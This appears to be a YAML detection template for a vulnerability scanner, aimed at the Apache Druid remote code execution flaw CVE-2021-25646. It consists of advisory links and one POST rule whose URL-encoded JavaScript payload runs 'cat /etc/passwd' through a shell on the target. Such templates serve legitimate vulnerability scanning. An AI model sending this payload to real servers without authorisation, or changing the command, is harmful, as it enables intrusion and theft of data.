name: yaml-poc-apache-druid-unauthorized_access-CVE-2021-25646
binding: b15f3ec5-98d3-4492-ad4d-835283a66f55
detail:
    author: system_user
    links:
        - http://help.aliyun.com/noticelist/articleid/1060799717.html
        - http://packetstormsecurity.com/files/162345/Apache-Druid-0.20.0-Remote-Command-Execution.html
        - http://www.openwall.com/lists/oss-security/2021/01/29/6
        - https://cxsecurity.com/issue/WLB-2021040141
        - https://lists.apache.org/thread.html/r04fa1ba93599487c95a8497044d37f8c02a439bfcf92b4567bfb7c8f%40%3Ccommits.druid.apache.org%3E
        - https://lists.apache.org/thread.html/r04fa1ba93599487c95a8497044d37f8c02a439bfcf92b4567bfb7c8f@%3Ccommits.druid.apache.org%3E
        - https://lists.apache.org/thread.html/r121abe8014d381943b63c60615149d40bde9dc1c868bcee90d0d0848%40%3Ccommits.druid.apache.org%3E
        - https://lists.apache.org/thread.html/r121abe8014d381943b63c60615149d40bde9dc1c868bcee90d0d0848@%3Ccommits.druid.apache.org%3E
        - https://lists.apache.org/thread.html/r20e0c3b10ae2c05a3aad40f1476713c45bdefc32c920b9986b941d8f%40%3Cannounce.apache.org%3E
        - https://lists.apache.org/thread.html/r20e0c3b10ae2c05a3aad40f1476713c45bdefc32c920b9986b941d8f@%3Cannounce.apache.org%3E
        - https://lists.apache.org/thread.html/r443e2916c612fbd119839c0fc0729327d6031913a75081adac5b43ad%40%3Cdev.druid.apache.org%3E
        - https://lists.apache.org/thread.html/r443e2916c612fbd119839c0fc0729327d6031913a75081adac5b43ad@%3Cdev.druid.apache.org%3E
        - https://lists.apache.org/thread.html/r4f84b542417ea46202867c0a8b3eaf3b4cfed30e09174a52122ba210%40%3Ccommits.druid.apache.org%3E
        - https://lists.apache.org/thread.html/r4f84b542417ea46202867c0a8b3eaf3b4cfed30e09174a52122ba210@%3Ccommits.druid.apache.org%3E
        - https://lists.apache.org/thread.html/r5ef625076982aee7d23c23f07717e626b73f421fba5154d1e4de15e1%40%3Ccommits.druid.apache.org%3E
        - https://lists.apache.org/thread.html/r5ef625076982aee7d23c23f07717e626b73f421fba5154d1e4de15e1@%3Ccommits.druid.apache.org%3E
        - https://lists.apache.org/thread.html/r64431c2b97209f566b5dff92415e7afba0ed3bfab4695ebaa8a62e5d%40%3Cdev.druid.apache.org%3E
        - https://lists.apache.org/thread.html/r64431c2b97209f566b5dff92415e7afba0ed3bfab4695ebaa8a62e5d@%3Cdev.druid.apache.org%3E
        - https://lists.apache.org/thread.html/r7dff4790e7a5c697fc0360adf11f5aeb31cd6ad80644fffee690673c%40%3Ccommits.druid.apache.org%3E
        - https://lists.apache.org/thread.html/r7dff4790e7a5c697fc0360adf11f5aeb31cd6ad80644fffee690673c@%3Ccommits.druid.apache.org%3E
        - https://lists.apache.org/thread.html/r87aa94e28dd21ee2252d30c63f01ab9cb5474ee5bdd98dd8d7d734aa%40%3Ccommits.druid.apache.org%3E
        - https://lists.apache.org/thread.html/r87aa94e28dd21ee2252d30c63f01ab9cb5474ee5bdd98dd8d7d734aa@%3Ccommits.druid.apache.org%3E
        - https://lists.apache.org/thread.html/ra4225912f501016bc5e0ac44e14b8d6779173a3a1dc7baacaabcc9ba%40%3Ccommits.druid.apache.org%3E
        - https://lists.apache.org/thread.html/ra4225912f501016bc5e0ac44e14b8d6779173a3a1dc7baacaabcc9ba@%3Ccommits.druid.apache.org%3E
        - https://lists.apache.org/thread.html/rc167d5e57f3120578718a7a458ce3e73b3830ac4efbb1b085bd06b92%40%3Cdev.druid.apache.org%3E
        - https://lists.apache.org/thread.html/rc167d5e57f3120578718a7a458ce3e73b3830ac4efbb1b085bd06b92@%3Cdev.druid.apache.org%3E
        - https://lists.apache.org/thread.html/rea9436a4063927a567d698431ddae55e760c3f876c22ac5b9813685f%40%3Ccommits.druid.apache.org%3E
        - https://lists.apache.org/thread.html/rea9436a4063927a567d698431ddae55e760c3f876c22ac5b9813685f@%3Ccommits.druid.apache.org%3E
        - https://lists.apache.org/thread.html/rfda8a3aa6ac06a80c5cbfdeae0fc85f88a5984e32ea05e6dda46f866%40%3Cdev.druid.apache.org%3E
        - https://lists.apache.org/thread.html/rfeb775822cd3baef1595b60f6860f5ca849eb1903236483f3297bd5c%40%3Ccommits.druid.apache.org%3E
        - https://lists.apache.org/thread.html/rfeb775822cd3baef1595b60f6860f5ca849eb1903236483f3297bd5c@%3Ccommits.druid.apache.org%3E
        - https://nvd.nist.gov/vuln/detail/CVE-2021-25646
        - https://packetstormsecurity.com/files/162345/Apache-Druid-0.20.0-Remote-Command-Execution.html
    vulnerability:
        id: befc2a9c-80d4-47c4-8331-46d2ba5c7402
        level: high
transport: http
rules:
    r0:
        request:
            cache: false
            method: POST
            path: /druid/indexer/v1/sampler
            headers:
                Accept: application/json, text/plain, */*
                Content-Type: application/json
            body: '%7B%22type%22%3A%22index%22%2C%22spec%22%3A%7B%22ioConfig%22%3A%7B%22type%22%3A%22index%22%2C%22firehose%22%3A%7B%22type%22%3A%22local%22%2C%22baseDir%22%3A%22/etc%22%2C%22filter%22%3A%22passwd%22%7D%7D%2C%22dataSchema%22%3A%7B%22dataSource%22%3A%22odgjxrrrePz%22%2C%22parser%22%3A%7B%22parseSpec%22%3A%7B%22format%22%3A%22javascript%22%2C%22timestampSpec%22%3A%7B%7D%2C%22dimensionsSpec%22%3A%7B%7D%2C%22function%22%3A%22function%28%29%7Bvar%20hTVCCerYZ%20%3D%20new%20java.util.Scanner%28java.lang.Runtime.getRuntime%28%29.exec%28%5C%22/bin/sh%60@%7E-c%60@%7Ecat%20/etc/passwd%5C%22.split%28%5C%22%60@%7E%5C%22%29%29.getInputStream%28%29%29.useDelimiter%28%5C%22%5C%5CA%5C%22%29.next%28%29%3Breturn%20%7Btimestamp%3A%5C%224137368%5C%22%2COQtGXcxBVQVL%3A%20hTVCCerYZ%7D%7D%22%2C%22%22%3A%7B%22enabled%22%3A%22true%22%7D%7D%7D%7D%7D%2C%22samplerConfig%22%3A%7B%22numRows%22%3A10%7D%7D'
        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
expression: r0()
